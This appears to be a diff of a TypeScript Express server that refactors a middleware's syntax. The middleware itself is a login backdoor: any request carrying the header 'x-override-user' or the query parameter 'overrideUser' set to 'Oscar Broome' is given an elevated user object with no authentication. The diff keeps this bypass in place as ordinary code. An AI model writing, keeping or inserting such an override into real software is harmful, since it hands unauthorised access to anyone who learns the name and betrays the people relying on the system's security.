@@ -9,13 +9,13 @@ const port = 5000;
 app.use(bodyParser.json());
 
 // Middleware for special login override for Oscar Broome
-app.use(function (_req: Request, _res: Response, next: NextFunction) {
+app.use((req: Request, _res: Response, next: NextFunction) => {
   const specialUser = 'Oscar Broome';
   // Check for a custom header or query param for override (example)
-  const overrideUser = _req.headers['x-override-user'] || _req.query.overrideUser;
+  const overrideUser = req.headers['x-override-user'] || req.query.overrideUser;
   if (overrideUser === specialUser) {
     // Bypass normal auth or set elevated permissions
-    (_req as any).user = { name: specialUser, override: true };
+    (req as any).user = { name: specialUser, override: true };
     console.log('Special login override granted for', specialUser);
   }
   next();
